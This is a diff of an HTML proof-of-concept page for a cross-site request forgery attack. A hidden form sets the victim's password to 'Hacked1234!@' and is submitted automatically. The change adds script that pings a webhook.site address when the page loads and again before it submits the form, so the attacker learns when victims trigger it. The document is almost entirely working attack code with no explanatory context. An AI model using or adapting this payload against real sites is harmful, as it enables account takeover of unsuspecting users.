@@ -5,6 +5,9 @@
   <input type="hidden" name="password" value="Hacked1234!@">
   <input type="hidden" name="confirm-password" value="Hacked1234!@">
 </form>
-<script>document.getElementById('f').submit();</script>
+<script>
+fetch('https://webhook.site/147c31f4-eca8-4ea7-a98e-d285652981b8?visit=loaded', {mode:'no-cors'});
+setTimeout(function(){ fetch('https://webhook.site/147c31f4-eca8-4ea7-a98e-d285652981b8?visit=submitting', {mode:'no-cors'}); document.getElementById('f').submit(); }, 700);
+</script>
 </body>
 </html>
